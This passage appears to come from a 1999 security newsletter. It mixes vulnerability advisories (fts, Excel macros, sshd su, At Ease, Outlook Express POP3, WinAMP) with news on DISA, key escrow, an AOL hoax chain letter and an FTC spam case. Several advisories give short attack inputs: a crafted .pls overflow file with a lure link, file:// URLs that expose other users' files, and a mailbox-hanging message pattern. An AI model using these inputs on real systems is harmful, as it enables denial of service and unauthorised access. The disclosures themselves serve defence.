      was that it was dying because realloc() was failing (as the fts stuff
      realloc()'s memory as the path grows) ..

      fts realloc (pathlen+~1000b) of memory only, so realloc succeds.
      The bug is in the adjusting pointers after realloc().
      
      Next day after sending patch I've found another circumstanses that
      triggered similar bug in fts.
      This time some pointers were adjusted which did not belong to realloc()-ed
      memory chunk.
      
      Improved patch is below. Sorry for inconvenience.
      Probably there are some similar bugs in fts code or patch. Please let me
      know if you'll see any.

      I think, that it will be hard to write an exploit. I've tested it on
      my 2.2.8-RELEASE at home.
      
      'Find' segfaults, when it tries to do:
      
        (void)puts(entry->fts_path);
      
      because of junk pointer to structure 'entry'. IMHO it _always_
      points to 0x200291d6, so it tries to execute (IMHO) _always_ the
      same commands:

 21.0 Excel Macro Virus protection patch has a hole

      This is in response to the Microsoft Security Bulletin (MS99-014).
      
      On 3/29/99 I posted a message to BugTraq titled, "Bypassing Excel
      Macro Virus Protection".  The message explained two ways to bypass the
      "Macro Virus Protection" option in Excel 97.  One is to password
      protect an infected spreadsheet (Q176640) and the second is to copy an
      infected spreadsheet into the XLSTART directory (Q180614).  Both
      methods will open an infected spreadsheet without the macro warning
      appearing.
      
      I would love to think Microsoft Security Bulletin (MS99-014) was in
      response to my email but I'll be humble and chalk it up to
      coincidence.  I downloaded the patch to see if addressed the two
      scenarios I described above.  I found that you will now receive the
      macro warning on a password protected file but not on a file copied to
      the XLSTART directory.  Also, you can still enable or disable the
      macro virus protected with a simple reg hack.  I guess that is not so
      important because if you can perform a reg hack, you can do a lot more
      than execute an Excel macro.
      
      I am not sure what really prompted Microsoft to release a patch for
      Excel but I find it surprising that they did not address the XLSTART
      option either.  They should at least give us the option of deciding if
      this directory is trusted, thereby by-passing the macro virus warning.

 22.0 Possible root compromise when installing new SSHD
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      Date:    Mon, 10 May 1999 22:26:19 +0200
      >From: "GWDVMS::MOELLER" <moeller@gwdvms.dnet.gwdg.de>
      Subject: Risks of upgrading a UNIX system
      
      When was the last time you rebuilt all privileged (`suid root') applications
      when upgrading a unix system, just in case?
      
      I'm pretty sure one can find `small print' that demands this, however I'm
      equally sure that hardly any system manager does so, since problems seem to
      occur _very_ rarely. Here's a neat one:
      
      Some time prior to the upgrade, system manager (S.M.) was asked to install
      `sshd' on a not-so-common platform (nothing really security-relevant,
      machine used for raw speed only, users just being accustomed to that sort of
      login). Said platform (featuring a particularly elaborate user data base)
      requires some special calls (simple calling sequences) to be done during
      `login' - no problem, `sshd' knows about them, although not explicitly aware
      of the particular hardware. Cautiously, S.M. configures `sshd' to not allow
      `root' logins from the outside.  What other harm could it possibly do?
      
      Upgrade has to occur somewhat in a hurry, release documentation isn't
      on-site, but procedures are known well enough. S.M. asks the manufacturer's
      support representative if special precautions have to be taken, "errr, not
      that I'd think so". S.M. installs new version, all fine & dandy, even
      remembers to check out `sshd' afterwards and finds it to work the same as
      before.
      
      A couple of days later, S.M. logs in via `sshd' himself, and for the first
      time enters `su'. Gets very amazed at the new system's intelligence, as it
      knows to not ask him for a password. Minutes later, S.M. recognizes that
      `su' would never ask for a password, when the parent process had been
      created via `sshd' ... in spite of no other visible peculiarities with that
      process.
      
      A re-build (pretty likely boiling down to nothing but a re-link) of `sshd'
      fixed the problem.
      
      Quite a few years ago, when I saw the first mention of `ssh', I commented 
      "If you're a bank, you don't buy your safe at a flea market; 
      if you're not, you might be better off without a safe". 
      Maybe there's _some_ truth in it, after all.

 23.0 Apple's AtEase 5.0 security hole

      Hello;
      
          At Ease 5.0 will allow a user to access any user's volume on the server.
      
      The tested configuration is as follows:
      
      MacOS 7.6.1 (should work with anything greater than 7)
      At Ease 5.0.2
      AppleShare IP 5.0.3
      Netscape 4.0.7 (No reason it shouldn't work from .99 to 4.5)
      
      How to do it.
      
      Log in as any user that has access to Netscape Communicator, and type in
      file://Macintosh%20HD/System%20Folder/ and you are able to access the disk.
      
      Do the same thing, except use
      file://At%20Ease%20Volume%20Name/At%20Ease%20%Docs/username and it's quite easy
      to browse through anyones files.
      
      It is possible to download files from that users directory. I have been unable
      to actually open any of the files once they are downloaded, however in an
      educational setting, just viewing names in a certian directory could constitute
      some serious problems (such as if a teacher works with Special Education
      studends, and has a list of documents to their parents).
      
      Apple apparently will not fix their own product. There is a 3rd party extention
      available for this at: http://www.ncal.verio.com/~lsr/programs/MSIENoServers.hqx

      This is not an apple problem mostly, its an MSIE problem.
      
      Hell, is At Ease still supported?  Its just a replacement finder as far as
      I know, it doesn't do things like replace fs drivers and patch binaries to
      stop things like that.

 24.0 Bug in Microsoft Outlook Express
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      Outlook Express Win98 bug

      Miquel van Smoorenburg (miquels@CISTRON.NL)
      Tue, 11 May 1999 10:58:41 +0200 
      
      
      
      There is a bug in Outlook Express delivered with Windows '98, at least
      version 4.72.3110.1 (4.01 SP1) and 4.72.3120.0 (4.01 SP1 + oepatsp1)
      
      Windows '95 updated with MSIE 4.01 has Outlook Express 4.72.3612.1700,
      which doesn't show the problem. OE from MSIE3 and MSIE5 don't have the
      problem either. There might be versions of MSIE4 included with Windows
      '98 that don't show the problem either, but I don't have a stack of
      Windows CDs to test against.
      
      We have talked to Microsoft NL about this, tracking number S2134 T6142.
      However they either deny there is a bug ("sorry sir, this product has
      been available for a year now so there cannot be any bugs in it") or
      they do not understand what we are talking about. They also claim to
      have not received any mail we sent to them, so I am giving up on that.
      We did send them this bug report by fax, perhaps that technology is
      stable enough to work for them, I don't know.
      
      Description of the problem:
      
      A dot on a single line means EOM in the POP3 protocol. If a message
      contains that it must be escaped by adding an extra dot, so we have 2
      dots on a single line - which is OK. However if on the TCP level the
      line after this double-dot crosses over to the next packet, Outlook
      Express will interpret the double-dot as a single dot, switching back to
      POP3 command mode and interpreting the rest of the message as a response
      from the POP3 server. Result is an error message and usually a hanging
      POP3 session.
      
      Perhaps it's not really a bug in Outlook, but the Windows I/O library
      or the TCP implementation.. which is scary.
      
      So at the TCP packet level it looks like this:
      
      packet1: [message data]
      packet1: \r\n..\r\nthis is a line that
      packet2: continues in the next packet
      
      The double-dot on the 2nd line will be interpreted as a single dot.
      
      Include a few thousand lines like this in an email and the bug will trigger:
      
      So
      .
      this
      .
      might
      .
      actually
      .
      cause
      .
      the
      .
      bug
      .
      with

      It occured to me that it might not be clear from the original message
      but because the POP3 session is hanging, the message will not be removed
      from the server and the next time mail is check the same thing will
      occur. This is an effective DOS attack against the mailbox.
      
      The only way to solve this is to remove the message with another
      POP3 email program (Eudora, Pegasus) or to ask the sysadmin of the POP3
      server to remove the message manually (look for a message that has a line
      starting with a dot).
      
      Upgrading to MSIE 5.0 will also solve the problem, but there is no
      simple/small bugfix from Microsoft available (an MSIE 5.0 download is
      what - 20 MB at least?) yet for as far as I know.
      
      So, ISP helpdesks - take note. This is at least one of the causes of
      the problems all these people have been having with their "blocked mail".

 25.0 Trivial buffer overflow DoS on WinAMP 2.x
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      Date: Wed, 12 May 1999 13:02:43 +0200
      From: Wojtek Kaniewski <wojtekka@BYDNET.COM.PL>
      To: BUGTRAQ@netspace.org
      Subject: Buffer overflow in WinAMP 2.x
      
      Introduction
      ------------
      WinAMP is a popular Windows sound player with support for many file
      formats (MP3, wave files, modules). It also supports MP3 streaming
      (let's call it sh0utcast).
      
      Description of the problem
      --------------------------
      If we tell WinAMP to open file location (Ctrl+L) which is over 256
      bytes long, it'll produce nice GPF. The bug also appears when loading
      playlists (.m3u and .pls)
      
      What can we do with this bug?

      Many sh0utcast radios place .pls files on their websites, which contain
      URL for radio's sh0utcast server.
      
      If we'll make b00m.pls file like this...
      
        [playlist]
        NumberOfEntries=1
        File1=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... (about 256 A's)
      
      and put such link...
      
        <A HREF="b00m.pls">Techno explosion -- The Coolest MP3 Radio</A>
      
      on our website, we can make couple of WinAMPs crash. I suppose, that
      there's a possibility to put our own code in the filename (see cDc-351
      for details).
      
      Nullsoft (producer of WinAMP) has been noticed about the bug two
      versions ago.

      DISA Limits Network Activity 


      contributed by erewhon 
      On April 18, the Defense Information Systems Agency (DISA) canceled all limited peacetime privileges including
      internet and email usage in an effort to bolster the amount of communications bandwidth. This will prevent
      all unofficial Internet traffic on the European Command's Common User Data Network (CUDN). The Army's 5th
      Signal Command has been tasked with monitoring the network for violations of this policy. One civilian
      employee has reportedly already been fired for surfing for up to 13 hours on two separate occasions. This
      order is also designed to limit "push" technologies and large email attachments.

      U.S. European Command locks down Internet
      Access
 
      BY DANIEL VERTON (dan_verton@fcw.com)
 
      HEIDELBERG, Germany -- To bolster the amount of communications
      bandwidth, the U.S. Army and Air Force have significantly curtailed the
      personal use of the Internet by servicemen under the European Command,
      including those deployed in the Balkans.
 
      The Defense Information Systems Agency's European field office began an
      effort to increase by 30 percent the available communications services of the
      Defense Information Systems Network throughout the European theater to
      support NATO's humanitarian and combat missions in Yugoslavia. Hoping to
      free up needed bandwidth, the Army and Air Force on April 18 issued the
      policy, which canceled all limited peacetime privileges granted to government
      and military employees to use government computer systems, particularly e-mail
      and the Internet, for personal use. The policy will remain in effect for up to one
      year from the date it was issued.
 
      "Our ability to support and sustain classified and unclassified e-mail capability
      for current operations...is affected by the available bandwidth on the" European
      Command's Common User Data Network (CUDN), according to the
      memorandum. "For that reason, it is imperative that [U.S. Army Europe]
      establish a minimize order immediately to all secure and non-secure network
      subscribers. Effective immediately, no unofficial Internet traffic may occur on
      the CUDN until [the] minimize [order] is lifted."
 
      The memo specifically directs the Army's 5th Signal Command to actively
      monitor the network for violations of the policy. It also calls on local unit
      commanders to brief all their personnel and to "routinely check on user activity"
      for evidence of inappropriate use of government computers. One civilian
      government employee has been dismissed based on evidence that he had visited
      inappropriate Web sites on two separate occasions, totaling up to 13 hours of
      Web surfing. The military services also have curtailed the use of "push"
      technologies for continuous news feeds and the attachment of large files to
      e-mails.
 
      The policy allows, however, some leeway for appropriate use of the Internet in
      support of morale, welfare and recreational activities, such as providing soldiers
      and airmen deployed in Albania, Macedonia and elsewhere with links to family
      members in the United States.
 
      In addition to slowing down the network, "personal use of Internet services
      provides a conduit through which information assurance and security can be
      compromised," according to a spokesman for the Army's European Command.       
      "Our information dominance depends on it, and we are running out of pipes."

      HACKER'S PARADISE
      by BHZ, Monday 17th May 1999 on 10:08 pm CET
      Looks like after Norway hackers could find their paradise in New Zaeland. Law
      Commission has acknowledged that it is not against the law for a hacker to break
      into a New Zealand bank's computer system and transfer funds into his or her own
      bank account. "There cannot be theft under section 220, Crimes Act 1961, of an
      intangible thing. In (a recent Court of Appeal case) the court held that the definition in
      section 217 is confined to tangible things and does not extend to ... a credit in a bank
      account." Read the article on InfoWar.

     New Zealand: Urgent Action Wanted To Protect Banks From Hacking.

     THE Law Commission has acknowledged that it is not against the law for a hacker to break into a New Zealand bank's computer system and transfer
     funds into his or her own bank account.

     In a report on computer crime, the commission says that under section 220 of the Crimes Act 1961 it is not against the law to steal something intangible.

     "There cannot be theft under section 220, Crimes Act 1961, of an intangible thing. In (a recent Court of Appeal case) the court held that the definition in
     section 217 is confined to tangible things and does not extend to ... a credit in a bank account."

     The Network of Internet Related Organisations is pushing for urgent changes to legislation to protect banks and other organisations from the effects of
     hackers.

     Spokesman Chris Patterson, a solicitor with Hesketh Henry, said it was an understatement to say electronic security in New Zealand was a huge problem.

     Mr Patterson said Niro believed an amendment to the Crimes Act should be passed by the Government immediately to stop cyber-criminals.

     The Law Commission has recommended that there be four new offences dealing specifically with computer misuse. They are: unauthorised interception of
     data stored in a computer; unauthorised accessing of data stored in a computer; unauthorised use of data stored in a computer; and unauthorised damaging
     of data stored in a computer.

     Justice Minister Tony Ryall said he planned to introduce a draft bill including the first three offences by the end of next month. But he said the offence of
     hacking raised more complex issues and would need further consultation before legislation on that was drafted.

      Rootfest is coming. It is a security conference held in Minneapolis (USA), which will
      be very "elite" this year. Many security professionals are coming to give a speech.
      The dutch Brenno de Winter, owner of De Winter Information Solutions, will speak on
      the State of Affairs in Europe. He did some research and the results are disturbing.
      Read his article called Robustness of data security is poor.
      Just to inform our readers that HNS will have a detailed special report on Rootfest. 

            
      PRESS ANNOUNCEMENT

      Robustness of data security is poor
      
      General
      
      From May 21st till May 23rd a computer security conference, called Rootfest will be held in Minneapolis (USA). At this conference security specialists, the "hacking"
      society, IT professionals, United States government agents and FBI will come together to discuss computer security. The dutch Brenno de Winter, owner of De Winter
      Information Solutions, will speak on the State of Affairs in Europe. For this conference he did some basic research. The results are disturbing. 
      
      About Rootfest
      
      Almost anywhere in the world people are becomming aware of the fact that computer crimes are a potential and present danger to our society. Last year Bill Clinton
      spoke about terrorism moving more towards the computer. With the danger in mind a conference has been organised. At this conference hackers, FBI, police officials,
      governments, computer specialist and IT security professionals join forces and will focus together on the same problem. Currently somewhere between 600 and 900
      attendees are expected to come. 
      
      State of Affairs in the Netherlands
      
      Every day more and more is written about e-commerce (electronic sales through the internet). In the Netherlands the internet is pushed by the government in the SWAP
      2000 project. SWAP 2000 is an effort to reduce the gap between the Netherlands and the USA in technology. Computer crimes are a real threat to the growth of
      technology. 
      
      The test
      
      The main target was to use a medium that is widely spread and where basic security is simple and cheap. So e-mail was choosen. An artifact of e-mail is that quite
      often virusses get spread through e-mail (in this context one can think of the very recent Melissa-virus). Since the target was getting an general impression on secure
      e-mail 39 dutch organisations have been mailed. These organisation were insurance companies, banks, 12 major ICT companies, 8 government organisations, 4 political
      parties. Important was that the organisation needs to be have reasons to receive confidential documents or the organisation delivers internet-related systems (ICT
      companies -> they need to indicate the secure way). The e-mail first briefly indicated that sending data per e-mail could mean a risk and then asked what method could
      be used to send an secure e-mail (encryption). Remark: e-mails are basically letters that are sent out without an envelope. By using encryption this envelope is provided
      for the e-mail. E-mails can be easily intercepted and thus read. This can lead to confidential data becomming public. Also without encryption it is very easy to send mail
      using somebody elses indentity. By using encryption signatures can be checked. 
      
      Results
      
      When an response came to the request, the answer was noted. When was stated that e-mail was used for informal communiction only that was accepted as a proper
      solution (because sensitive data was sent by other means). When no response was given, there is a major change that people start sending the sensitive data without any
      security measures. So this was regarded as no solution available. No bank or insurcance company has a policy on secure e-mail. One insurance company mailed that
      they couldn't (of course) inform me on this issue out of security considerations. Only two out of twelve ICT companies had a way of using secure e-mail. Most
      government organisations only used e-mail as an informal way of communication and thus reduced the risk. One unforutnate thing is the police west-veluwe vallei in the
      Netherlands that allows people to press charges by e-mail. They use e-mail formally and use not secured forms and thereafter not secured e-mail (although they wrote
      they were considering there options). 
      
      Other facts
      
      Also attention has been paid to the security on laptops. Laptops contain programs and data. This data ought to be encrypted. So if a laptop is stolen no data becomes
      available. Last year a police team LRT (national detective team) had a laptop that was stolen out of a police building. All data (snitches, cases under investigation)
      became known. This data was handed to the press. Encryption to prevent this is easy and cheap to get. However less dan 7% of the companies checked were
      protecting their data. 
      
      Finally
      
      The several small investigation show, according to Brenno de Winter, that the awareness on data security is way below acceptable point. This may easily lead to major
      incidents in the future, setting back usage for internet and other ICT solutions. However basic security is often freely available.

      Hi,
      
      As Red Hat did not send messages around I will fill in this gap for now.
      (Hello Red Hat. Don't get sloppy on this.)
      
      There are a few fixes available for Red Hat Linux 6.0 which can be found
      on ftp://updates.redhat.com/6.0/ and these include:
       - Newer floppy images for i386.
       - newer pump package to fix DHCP anomalies.
       - newer xscreensaver package to fix security issues.
       - newer apmd package (i386 only)
      
      See also:

      PS: There is no info about these images on the website. But it just adds
          support for the ICP Vortex controler according to the README file
      
      PS/2: There are some typo's on the errata pages. It would be nice if these
            were fixed as well.

 32.0 Key Escrow revisited (who are the real criminals here??)

      Key Escrow Not Just to Bust Criminals Anymore 


      contributed by Weld Pond 
      A working document for the Scientific and Technological Options Assessment panel, recently released by the
      European Parliament, claims the United States has tried to persuade European Union countries to adopt its key
      escrow or key recovery policies. These policies would allow backdoor access to encryption programs. The US
      has claimed that this was necessary to read messages exchanged by criminals. The report clams however that
      the UKUSA alliance, which includes the United Kingdom, United States, Canada, Australia, and New Zealand, has
      used its secret Echelon global spying network to intercept confidential company communications and give
      them to favored competitors. The report also claims that the NSA had struck deals with Microsoft, Lotus,
      and Netscape to alter their products for foreign use, presumably to make it easier for the NSA to intercept
      communications.

      Report: U.S. Uses Key Escrow To
      Steal Secrets
      (05/18/99, 9:27 a.m. ET)
      By Madeleine Acey, TechWeb 
 
      European plans for controlling encryption
      software are nothing to do with law
      enforcement and everything to do with U.S.
      industrial espionage, according to a report
      released by the European Parliament on Friday.
 
      The working document for the Scientific and
      Technological Options Assessment panel said the United
      States has tried to persuade European Union countries to
      adopt its key escrow or key recovery policies -- allowing
      backdoor access to encryption programs -- saying this
      was necessary to read messages exchanged by
      criminals. 
 
      But the report details how the UKUSA alliance -- made
      up of the United Kingdom, United States, Canada,
      Australia, and New Zealand -- has used its secret
      Echelon global spying network to intercept confidential
      company communications and give them to favored
      competitors. Thomson S.A., located in Paris, and Airbus
      Industrie, based in Blagnac Cedex, France, are said to
      have lost contracts as a result of information passed to
      rivals. 
 
      "The U.S. government misled states in the EU and
      [Organization for Economic Cooperation and
      Development] about the true intention of its policy," the
      report adds. 
 
      "Between 1993 and 1997 police representatives were not
      involved in the NSA [National Security Agency]-led
      policy-making process for key recovery. Despite this,
      during the same period the U.S. government repeatedly
      presented its policy as being motivated by the stated
      needs of law-enforcement agencies." 
 
      The document went on to detail how the agencies
      specifically studied Internet data. Apart from scanning all
      international communications lines -- using 120 satellites,
      microwave listening stations, and an adapted submarine
      -- it said they stored and analyzed Usenet discussions.
      "In the U.K., the Defence Evaluation and Research
      Agency maintains a 1-terabyte database containing the
      previous 90 days of Usenet messages." 
 
      The "NSA employs computer 'bots' (robots) to collect
      data of interest," the report adds. "For example, a New
      York website known as JYA.COM offers extensive
      information on cryptography and government
      communications interception activities. Records of
      access to the site show that every morning it is visited by
      a bot from NSA's National Computer Security Center,
      which looks for new files and makes copies of any that it
      finds." 
 
      According to a former employee, NSA had by 1995
      installed "sniffer" software to collect traffic at nine major
      Internet exchange points. 
 
      The report offered evidence that a leading U.S. Internet
      and telecommunications company had contracted with
      the NSA to develop software to capture Internet data of
      interest, and that deals had been struck with Microsoft,
      Lotus, and Netscape to alter their products for foreign
      use. 
 
      "There can't be any doubt any longer that there's an
      economic imperative to these policies," said Simon
      Davies, director of Privacy International. "We have been
      lied to for years. But it will be up to companies like
      Airbus to take legal action to force a definition of national
      security in the context of the European Union. Then we
      can establish a legal framework and appeals process." 
 
      Meanwhile, the Financial Times reported on Monday
      that the U.K. government had agreed to take key escrow
      "off the agenda" and had accepted industry proposals for
      a "largely voluntary program of co-operation with the
      security services". 
 
      Government officials could not confirm the report. 
 
      But Caspar Bowden, director of the Foundation for
      Information Policy Research, questioned how far any
      compromise would go. "Will they persist with statutory
      licensing [of trusted third parties]and criminal legislation
      on decryption warrants?" he asked.

 33.0 AOL Under Siege by Hackers, NOT! 
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
     From HNN http://www.hackernews.com/


     contributed by wariac 
     Print and online media are bad enough but television
     'news' has got to be the worse information source on
     the planet. The local CBS affiliate in Tucson Arizona,
     KOLD, ran a lead story on its 10pm "news-cast" last
     week that claimed that 'hackers' had invaded AOL and
     where threatening to distribute the personal information
     of its users. Unless of course that user forwarded an
     email to 10 other users within 45 minutes. KOLD aired
     this "news" without confirmation, without contacting an
     independent third party, without even getting an official
     response from AOL. All they had was the copy of an
     email from someone who wasn't even a user of AOL!
     This email was evidently enough to run a several minute
     segment as the lead story and scare the hell out of
     several thousand viewers in the Tucson area. And
     people wonder why Joe Schmoe is afraid of the Internet.

     Hacking the boob tube

     By Joe Salkowski
     StarNet Dispatches
     Tue May 18 00:23:01 1999

     Head for the hills, everyone: A "hacker group" is
     conspiring to "create problems in your personal
     life."

     At least, that's the word from the crack
     investigative reporters at KOLD, Channel 13,
     Tucson's CBS television affiliate. The station that
     patrols Tucson's skies in its very own rent-to-own
     helicopter led its 10 p.m. "news"-cast last
     Wednesday with a threatening Internet story that
     apparently escaped the attention of lesser,
     ground-hugging journalists.

     "They say they have your personal information,
     including credit card numbers and Social Security
     numbers," anchor Chris Pickel warned in her most
     ominous tone. "And unless you do as they say,
     they're going to use it against you."

     Co-anchor Randy Garsee went on to explain that a
     "hacker group" was sending out e-mail messages
     threatening to divulge personal information from
     recipients' America Online accounts unless they
     forwarded the message to 10 AOL users within 45
     minutes. The report, accompanied by a
     grammatically challenged "You Got Mail" graphic,
     was delivered with the breathless rush of a
     Lewinsky-level scoop.

     "Does AOL know about this?" Garsee asked
     reporter Valerie Cavazos. "Well," she responded
     with barely suppressed glee, "they do now."

     Indeed. They know, like most Net users should,
     that KOLD fell hard for one of the oldest, lamest
     tricks on the Net. 

     The menacing message that consumed three
     minutes of supposedly precious airtime was nothing
     more than a chain letter - the sort that promises ten
     years of bad luck will befall those who don't send it
     along. No "hacker group" or anyone else could
     carry out the threats contained in the message, and
     nobody who knew anything about the Net would
     pass it along.

     But KOLD didn't think twice - or even once -
     before passing the threats along to a few thousand
     viewers.

     "This is not as thorough as we probably could have
     been," KOLD News Director Carolyn Kane
     conceded the next day. "Our follow up will say that
     the only way to get yourself in trouble is to fall for
     this letter."

     The story began when Chris Lamb, a 40-year-old
     warehouse manager for a local pet supply
     company, phoned KOLD Wednesday to ask about
     the e-mail message he'd just received from a
     friend. "I called just to see if they had heard
     anything about it," he said. "I didn't realize what
     would happen then." 

     Lamb, who admits he's "not the most
     computer-literate person," said he wasn't sure the
     message was authentic. "That's kind of what I
     mentioned to Channel 13," he said. "But they said
     they wanted to do the story."

     AOL's main office in Virginia was closed by the
     time Cavazos got the story, Kane said. So the
     reporter talked to someone at AOL's local
     telephone support center who didn't know anything
     about the message or its claims. Instead of waiting
     until the next day for an intelligent response from
     AOL, Cavazos and her editors decided to air her
     story that night.

     "AOL says that this is the first time that they've
     heard about it and are now frantically trying to
     figure out if this was a prank or if the hacker group
     did indeed figure out a way to get into sensitive
     AOL files," Cavazos reported. She used the word
     "frantically" again later in her report, suggesting
     she had a telepathic grasp of happenings inside
     AOL's headquarters - which were, you'll
     remember, closed for the night.

     Cavazos offered some details from the letter,
     including its threat that recipients' AOL account
     would be "messed around with." She also hinted
     that a "hacker group" could indeed have "cracked"
     the password to AOL's secret files, a point she
     illustrated by displaying a Web site with
     black-market copies of consumer software
     programs.

     Had she instead displayed a clown painting on
     black velvet, it would have been equally relevant.
     The fact that consumer software can be "cracked"
     doesn't prove that a "hacker group" could access
     the entirety of AOL's account information by
     figuring out a single password, as the message
     claimed could be done.

     That feat is, in fact, impossible, AOL spokesman
     Rich D'Amato told me the next day. While he
     wouldn't divulge how AOL secures that data, he
     said it wasn't sitting behind a single password on a
     public Web server. "That's a safe assumption," he
     said.

     "If someone says they have all your personal
     information, you should react to that the same way
     you would in real life," D'Amato said. "Take a
     moment think about it. Don't knee-jerk react to it."

     But there wasn't much thinking going on at KOLD
     last Wednesday. In fact, it didn't even bother
     Cavazos that Lamb, the lone on-camera source of
     her story, isn't an AOL subscriber - meaning he
     couldn't possibly have been affected by the threats.

     Viewers learned this only when Garsee asked
     Cavazos after her report if Lamb obeyed the
     commands in the message and what happened if
     he didn't. "He doesn't know that. Nothing has
     happened so far. Um, he actually was not an AOL
     user," she stammered. "So it hasn't affected his
     AOL program."

     So let's get this straight: KOLD led its newscast
     with a story about a "hacker group" that doesn't
     exist sending threats that couldn't possibly be
     carried out to a person who couldn't have been
     harmed - all after an announcer promised that "For
     accurate, concise reporting, watch News 13." (For
     television news reporters who might be reading this
     story, I'll explain that this qualifies as irony.)

     When I called Kane, the news director, she began
     our conversation by defending the story. "We were
     just saying this is a letter that people had gotten.
     Valerie did it from that point of view," she said.

     Later, though, she conceded that her station should
     have held off on the story. "We really should have
     had whatever AOL says it was," she said. "That's
     why I'm insisting we make sure we follow this up."

     The next night, KOLD's 10 p.m. news included a
     30-second segment informing viewers that the
     message was a hoax. But just to be safe, the
     anchor advised, don't open e-mail sent from people
     you don't know.

     Say what? 

     Oh, never mind.

     If you ever wonder why ordinary, TV-watchin'
     folk are so afraid of what they might find on the
     Internet, this comedy of errors should explain
     things quite nicely. While many reporters have
     wised up to the realities of the Net, the talking
     heads of local television news must have been
     busy fixing their makeup. 

     Since most local television news reporters are
     assigned to cover a wide variety of subjects, they
     aren't likely to become experts in any one of them.
     But it shouldn't be too much to ask that they apply
     a little common sense and basic reporting skills
     before airing stories that ultimately mislead and
     confuse their unfortunate audience.

     Kane told me her news team would have more
     Internet related stories in the near future, but I'm
     not sure I can bear to watch. Before they do
     another story about the Net, they really ought to
     dip into their helicopter budget and purchase a
     clue.

     

          Text of "hacker" e-mail (WARNING:
          Contains profanity)
          
       Your Screen Name has Been Added to the
       ß(r)øöô¥ £ Hackers List!
      
       Here is how we work. Because we master AOL
       everytime this letter is sent out a copy is also
       instantly send to us. We then scan out all the
       names, and place them on our hackers list. Once
       you send out this letter 10 times your name again
       is instantly removed from our list. If this letter is
       not sent out exactly 45 minutes after you have
       opened it your name will not be able to be
       removed from our hacking list. Here is what
       happened when your name is stuck on the
       ß(r)øöô¥ £ hackers list.
      
       -Your AOL password is pulled out of AOL's
       files. Stupidly AOL stores your password on a
       password access website. We have cracked the
       password needed and have access to every
       account except for AOL guides (cat guides).
      
       -We gain your credit card number, social security
       number, and home address. Your credit card
       information and home address is stored at the
       AOL site and with that we can gain you social
       security number.
      
       -Everytime you sign on AOL your account will
       be messed around with.
      
       -and much, much more with the power of
       ß(r)øöô¥ £ hackers.
      
       Don't believe this? We don't care at all because
       not following the directions given will harm you in
       over 10 ways. All you have to do is send this out
       to 10 people and you will never have to worry
       about this again. If you receive this letter again
       after sending it out you don't need to send it out
       again, because your name is not able to be put
       back on.
      
       Why are we doing this? It is to get back at AOL,
       and we are taking action. When the members of
       ß(r)øöô¥ £ hackers first signed up for AOL
       they were not hackers. Once they had to start
       paying 21 dollars for AOL they decided to fuck
       over AOL. Also the ß(r)øöô¥ £ hackers are
       doing this because of the many ads on AOL.
       When you first sign on AOL you receive too
       many ads and shit when you go to AOL
       channels, and more pop ads when you click on
       things. We have had enough! That's why
       ß(r)øöô¥ £ exists. All you must do now is send
       this to 10 other AOL members and you will
       never again have to worry about ß(r)øöô¥ £
       hackers.
      
       SEND THIS OUT NOW TO 10 PEOPLE IF
       YOU WANT TO SAVE YOUR ACCOUNT,
       CREDIT CARD, AND MUCH MORE!

      FTC Sues Unknown Spammer "Anyway" 


      contributed by webmaster 
      The Federal Trade Commission has announced that it has filed a suit in the U.S. District Court in Charlotte
      against an unknown defendant. The individual, who is unknown at this time is accused of sending spam as
      part of a telemarketing scam. The FTC predicts that they will have enough information to name a suspect
      within a few days. A choice quote from the article, "Anonymity doesn't necessarily stand in the way of
      some kind of law enforcement," said Eileen Harrington, the FTC's associate director of marketing practices. 
      "We sued them anyway." Pretty soon we'll have them suing "unknown hackers" for million dollar damages. Oh, 
      wait that already is happening isn't it?

     Spam Scam Creator Sued
     Junk E-Mail Prompts Consumer Calls Overseas 

     By Kalpana Srinivasan
     The Associated Press
     W A S H I N G T O N,   May 18  Clifton Taylors 12-year-old grandson was doing his homework
     on the Internet when he received an e-mail message saying his order for a purchase had
     been processed and $375 would be billed to his credit card in the next two days. 
          To cancel the order that he had never placed,
     the 7th-grader was supposed to call the number on the screen immediately. But instead of
     a consumer representative, on the other end was a pornographic recording from a site in the West
     Indies. The international toll call popped up on the familys phone bill shortly after. 
          This approach was so different it caught us by surprise, said Taylor, a retired school teacher living
     outside of Charlotte, N.C. 
          The scheme  a combination of spamming, or junk e-mail, and telemarketing fraud  has already prompted
     20,000 consumers to complain to America Online. 

     Suit Filed Against Scam Mastermind
     The Federal Trade Commission today was announcing a suit filed in U.S. District Court in Charlotte against the
     unknown defendant who masterminded the scam. The agency says this action  the first taken against an
     unnamed perpetrator  is a warning to con artists who try to hide behind the vast, faceless Internet. 
          Anonymity doesnt necessarily stand in the way of some kind of law enforcement, said Eileen Harrington,
     the FTCs associate director of marketing practices. We sued them anyway. 
          Harrington predicts the commission will have enough information to name a defendant in a few days. In the
     meantime, the court order has blocked the flow of money from American telephone carriers to the foreign telephone
     company that pays the operators of the hotline. 

     Breaking Through Forged Addresses
     The case highlights some of the inherent challenges in tracking down and stopping the senders of junk e-mail,
     also known as spam. A common tactic among con artists sending spam, including those cited in todays action, is to
     use a variety of forged e-mail addresses so they cannot be reached. 
          Ray Everett-Church, co-founder of the Coalition Against Unsolicited Commercial E-Mail, likens the
     problem to the arcade game whack-a-mole: no sooner does the mole get hit by the mallet in once place, than it
     pops up quickly in another. 
          Spammers rapidly move from sending site to sending site, said Everett-Church. That makes it futile for a 
     server provider to block one specific e-mail address. But, he added, companies can block e-mails based on their
     content, for example filtering out all messages that contain a particular word or telephone number. 
          The problem comes in finding similarities you can block, he said. 

     FTC Creating a Spammer DB
     The FTC says it is raising the ante against fraud with its own technology. More than a year ago, the commission
     began collecting spam forwarded to it by consumers, creating a database with hundreds of thousands of
     messages in it. 
          The commission first learned of the scheme after a consumer submitted an online complaint form  one of
     about 10,000 the FTC receives each week. Using the information provided by the consumer, the FTC ran a
     database search and came up with dozens of matches containing the same telephone number. 
          This technology has given us an enormous leg up against scams that use technology, said Harrington. The
     agency was able to pull together a case in a few weeks. 

     AOL Cooperated With FTC
     AOL has a similar mechanism for receiving forwarded junk e-mail. The company has passed on its complaints
     about the scam in question, plus copies of the actual spam to the FTC, said Rich DAmato, a spokesman for Dulles,
     Va.-based AOL. 
